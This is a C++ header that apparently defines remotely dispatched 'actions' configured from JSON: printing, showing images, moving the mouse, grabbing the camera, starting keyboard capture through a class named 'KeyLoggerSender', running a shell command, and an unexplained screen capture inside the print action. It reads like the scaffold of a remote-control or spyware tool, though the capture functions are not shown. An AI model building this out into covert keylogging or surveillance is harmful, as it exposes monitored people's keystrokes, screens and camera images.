#pragma once
#include <Actions/ActionsDef.h>
// ------------------------------ Actions Implementations
// ------------------------------ //
// --- Derived Actions ---
class PrintAction final : public Action
{
  public:
    PrintAction(): Action("PrintAction")
    {
        SetInputOn();
    }

    void execute(const std::function<void(const DataStruct &)> callback) override
    {
        // Convert to PrintActionRequest
        OperatingSystemManager::CaptureScreen();

        std::cout << "Printing: " << actionData->message << "\n";
        callback({*actionData}); // No output
    }

    void initialize(const json &json) override
    {
        actionData = std::make_shared<PrintMessage_S>(json.get<PrintMessage_S>());
    }

  private:
    std::shared_ptr<PrintMessage_S> actionData;
};

// --- Show image on screen ---
class ShowImageAction final : public Action
{
  public:
    ShowImageAction(): Action("ShowImage")
    {
        SetInputOn();
    }

    void execute(const std::function<void(const DataStruct &)> callback) override
    {
        // Some interface that will work with operating system.
        std::cout << "Showing image: " << actionData->image_path << "\n";
        callback({*actionData});
    }

    void initialize(const json &json) override
    {
        actionData = std::make_shared<ShowImage_S>(json.get<ShowImage_S>());
    }

    std::shared_ptr<ShowImage_S> actionData;
};

// --- Set mouse position ---
class SetMousePositionAction final : public Action
{
  public:
    SetMousePositionAction(): Action("SetMousePosition")
    {
        SetInputOn();
    }

    void execute(const std::function<void(const DataStruct &)> callback) override
    {
        for (const auto &data : *actionsData)
        {
            OperatingSystemManager::SetMousePosition(data.x, data.y);
        }
        callback({}); // No output
    }

    void initialize(const json &json) override
    {
        actionsData = std::make_shared<std::vector<MousePosition_S>>(json.get<std::vector<MousePosition_S>>());
    };

    std::shared_ptr<std::vector<MousePosition_S>> actionsData;
};

class GetCamera final : public Action
{
  public:
    GetCamera(): Action("GetCamera")
    {
        SetInputOff();
    }

    void execute(std::function<void(const DataStruct &)> callback) override
    {
        OperatingSystemManager::GetImageFromCamera();
    };

    void initialize(const json &json) override {};
};

// --- Get Keyboard Input ---
class KeyLoggerSender final : public Action
{
  public:
    KeyLoggerSender(): Action("KeyLoggerSender")
    {
        SetInputOff();
    }

    void execute(std::function<void(const DataStruct &)> callback) override
    {
        OperatingSystemManager::StartCapturingKeyboard();
    };
};

class RunCommand final : public Action
{
  public:
    RunCommand(): Action("RunCommand")
    {
        SetInputOff();
    }

    void execute(std::function<void(const DataStruct &)> callback) override
    {
        OperatingSystemManager os;
        OperatingSystemManager::RunCMDCommand("echo Hello World");
        callback({});
    };
};

//! TODO: Register new actions
//* Register new actions
inline void ActionManager::initialize() const
{
    factory->registerAction<ShowImageAction>();
    factory->registerAction<SetMousePositionAction>();
    factory->registerAction<PrintAction>();
    factory->registerAction<GetCamera>();
    factory->registerAction<KeyLoggerSender>();
    factory->registerAction<RunCommand>();
}